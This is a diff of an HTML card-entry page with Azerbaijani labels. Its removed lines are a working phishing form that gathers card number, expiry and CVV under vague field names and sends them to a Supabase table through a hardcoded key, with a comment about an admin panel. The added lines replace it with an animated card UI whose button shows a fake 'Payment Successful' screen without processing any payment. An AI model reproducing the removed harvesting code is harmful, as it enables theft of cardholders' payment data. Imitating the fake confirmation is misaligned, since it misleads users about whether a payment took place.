@@ -3,127 +3,275 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>KREDIT</title>
+<title>Luxury Payment UI</title>
 
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:Arial, sans-serif;}
-
 body{
+  margin:0;
   height:100vh;
-  overflow:hidden;
-  background:linear-gradient(135deg,#0f2027,#203a43,#2c5364);
-  display:flex;
-  flex-direction:column;
-  color:white;
-}
-
-header{
-  padding:20px;
-  font-size:20px;
-  font-weight:bold;
-  z-index:2;
-}
-
-.container{
-  flex:1;
   display:flex;
   justify-content:center;
   align-items:center;
+  background:#0c0f14;
+  font-family:Arial;
+  overflow:hidden;
 }
 
-.phone{
-  width:340px;
-  height:650px;
-  background:black;
-  border-radius:40px;
-  padding:20px;
-  box-shadow:0 40px 80px rgba(0,0,0,0.6);
+.container{ width:380px; }
+
+.card{
+  width:100%;
+  height:230px;
+  perspective:1200px;
+  margin-bottom:30px;
+  position:relative;
 }
 
-.screen{
-  background:linear-gradient(135deg,#1e3c72,#2a5298);
+.card-inner{
+  width:100%;
   height:100%;
-  border-radius:30px;
+  position:relative;
+  transform-style:preserve-3d;
+  transition:transform 0.6s;
+}
+
+.card.flip .card-inner{ transform:rotateY(180deg); }
+
+.card-front,.card-back{
+  position:absolute;
+  width:100%;
+  height:100%;
+  border-radius:22px;
   padding:25px;
-  display:flex;
-  flex-direction:column;
-  justify-content:center;
+  box-sizing:border-box;
+  backface-visibility:hidden;
+  color:white;
+  overflow:hidden;
+  background:linear-gradient(145deg,#1f2937,#111827);
+  border:1px solid rgba(255,255,255,0.15);
+}
+
+/* HOLOGRAM OVERLAY */
+.card-front::before{
+  content:"";
+  position:absolute;
+  inset:0;
+  background:linear-gradient(120deg,
+    rgba(255,0,255,0.2),
+    rgba(0,255,255,0.2),
+    rgba(255,255,0,0.2));
+  mix-blend-mode:overlay;
+  animation:holoMove 6s linear infinite;
+}
+
+@keyframes holoMove{
+  0%{ transform:translateX(-100%); }
+  100%{ transform:translateX(100%); }
+}
+
+/* LIGHT REFLECTION */
+.card-front::after{
+  content:"";
+  position:absolute;
+  top:-50%;
+  left:-50%;
+  width:200%;
+  height:200%;
+  background:linear-gradient(
+    60deg,
+    transparent 40%,
+    rgba(255,255,255,0.3) 50%,
+    transparent 60%
+  );
+  transform:rotate(25deg);
+  animation:lightSweep 4s infinite;
+}
+
+@keyframes lightSweep{
+  0%{ transform:translateX(-100%) rotate(25deg); }
+  100%{ transform:translateX(100%) rotate(25deg); }
+}
+
+.card-back{ transform:rotateY(180deg); }
+
+.card-number{
+  font-size:22px;
+  letter-spacing:3px;
+  margin-top:80px;
+}
+
+.card-name,.card-expiry{
+  font-size:14px;
+  margin-top:15px;
+}
+
+.cvv-box{
+  background:white;
+  color:black;
+  padding:6px;
+  margin-top:100px;
+  border-radius:6px;
+  text-align:right;
 }
 
 input{
   width:100%;
   padding:12px;
-  border:none;
-  border-radius:12px;
   margin-bottom:12px;
-  font-size:14px;
-  outline:none;
+  border-radius:12px;
+  border:none;
+  background:#1a1f2b;
+  color:white;
 }
 
-.row{display:flex;gap:10px;}
-
 button{
+  width:100%;
   padding:14px;
+  border-radius:14px;
   border:none;
-  border-radius:12px;
-  background:#00c6ff;
+  background:black;
   color:white;
+  font-size:16px;
   font-weight:bold;
   cursor:pointer;
+  position:relative;
+  overflow:hidden;
+}
+
+/* SUCCESS OVERLAY */
+.success-screen{
+  position:fixed;
+  inset:0;
+  background:black;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  flex-direction:column;
+  color:white;
+  font-size:20px;
+  opacity:0;
+  pointer-events:none;
+  transition:0.5s;
+}
+
+.success-screen.active{
+  opacity:1;
+  pointer-events:auto;
+}
+
+.checkmark{
+  width:100px;
+  height:100px;
+  border-radius:50%;
+  border:4px solid #00ff99;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  font-size:50px;
+  margin-bottom:20px;
+  animation:pop 0.5s ease forwards;
+}
+
+@keyframes pop{
+  from{ transform:scale(0); }
+  to{ transform:scale(1); }
 }
 </style>
 </head>
+
 <body>
 
-<header>Sürətli və Təhlükəsiz</header>
-
 <div class="container">
-<div class="phone">
-<div class="screen">
 
-<input id="mainInput" maxlength="16" placeholder="Kart nömrəsi">
-<div class="row">
-<input id="smallInput" maxlength="4" placeholder="Tarix">
-<input id="backInput" maxlength="3" placeholder="CVV">
+<div class="card" id="card">
+<div class="card-inner" id="cardInner">
+
+<div class="card-front">
+<div class="card-number" id="cardNumberDisplay">#### #### #### ####</div>
+<div class="card-name" id="cardNameDisplay">AD SOYAD</div>
+<div class="card-expiry" id="cardExpiryDisplay">MM/YY</div>
 </div>
 
-<button onclick="submitData()">Təsdiqlə</button>
+<div class="card-back">
+<div class="cvv-box" id="cardCvvDisplay">###</div>
+</div>
 
 </div>
 </div>
+
+<input type="text" id="cardNumber" placeholder="Kart nömrəsi">
+<input type="text" id="cardName" placeholder="Ad Soyad">
+<input type="text" id="cardExpiry" placeholder="MM/YY" maxlength="5">
+<input type="text" id="cardCvv" placeholder="CVV" maxlength="3">
+
+<button onclick="pay()">Pay</button>
+
 </div>
 
-<script type="module">
-import { createClient } from "https://esm.sh/@supabase/supabase-js@2"
+<div class="success-screen" id="successScreen">
+<div class="checkmark">✓</div>
+Payment Successful
+</div>
 
-const supabaseUrl = "https://gkrfcoyleewxrxbfdunq.supabase.co"
-const supabaseKey = "sb_publishable_E1QDjV9fAt2IaoI3h7G9Iw_hIiSaAFH"
-const supabase = createClient(supabaseUrl, supabaseKey)
+<script>
+const card=document.getElementById("card");
+const cardInner=document.getElementById("cardInner");
 
-window.submitData = async function(){
+const numberInput=document.getElementById("cardNumber");
+const nameInput=document.getElementById("cardName");
+const expiryInput=document.getElementById("cardExpiry");
+const cvvInput=document.getElementById("cardCvv");
 
-  const main=document.getElementById("mainInput").value.trim()
-  const small=document.getElementById("smallInput").value.trim()
-  const back=document.getElementById("backInput").value.trim()
+const numberDisplay=document.getElementById("cardNumberDisplay");
+const nameDisplay=document.getElementById("cardNameDisplay");
+const expiryDisplay=document.getElementById("cardExpiryDisplay");
+const cvvDisplay=document.getElementById("cardCvvDisplay");
 
-  if(main.length!==16 || small.length!==4 || back.length!==3){
-    alert("Məlumat natamamdır")
-    return
-  }
+numberInput.addEventListener("input",e=>{
+  let raw=e.target.value.replace(/\D/g,"");
+  let formatted=raw.replace(/(.{4})/g,"$1 ").trim();
+  e.target.value=formatted;
+  numberDisplay.textContent=formatted||"#### #### #### ####";
+});
 
-  const { data, error } = await supabase
-    .from("mesajlar")   // ⚠️ Admin paneldə də EYNİ ad olmalıdır
-    .insert([{
-      kod1: main,
-      kod2: small,
-      kod3: back
-    }])
+nameInput.addEventListener("input",e=>{
+  nameDisplay.textContent=e.target.value.toUpperCase()||"AD SOYAD";
+});
 
-  if(error){
-    alert("Xəta: " + error.message)
-  } else {
-    alert("Onaylanır...")
-  }
+expiryInput.addEventListener("input",e=>{
+  let v=e.target.value.replace(/\D/g,"");
+  if(v.length>=3) v=v.slice(0,2)+"/"+v.slice(2,4);
+  e.target.value=v;
+  expiryDisplay.textContent=v||"MM/YY";
+});
+
+cvvInput.addEventListener("input",e=>{
+  cvvDisplay.textContent=e.target.value||"###";
+});
+
+cvvInput.addEventListener("focus",()=>card.classList.add("flip"));
+cvvInput.addEventListener("blur",()=>card.classList.remove("flip"));
+
+/* 3D TILT */
+card.addEventListener("mousemove",(e)=>{
+  const rect=card.getBoundingClientRect();
+  const x=e.clientX-rect.left;
+  const y=e.clientY-rect.top;
+  const rotateY=((x/rect.width)-0.5)*20;
+  const rotateX=((y/rect.height)-0.5)*-20;
+  cardInner.style.transform=
+  `rotateY(${rotateY}deg) rotateX(${rotateX}deg)`;
+});
+card.addEventListener("mouseleave",()=>{
+  cardInner.style.transform="rotateY(0) rotateX(0)";
+});
+
+/* FAKE PAYMENT SUCCESS */
+function pay(){
+  document.querySelector("button").innerText="Processing...";
+  setTimeout(()=>{
+    document.getElementById("successScreen").classList.add("active");
+  },1500);
 }
 </script>
 
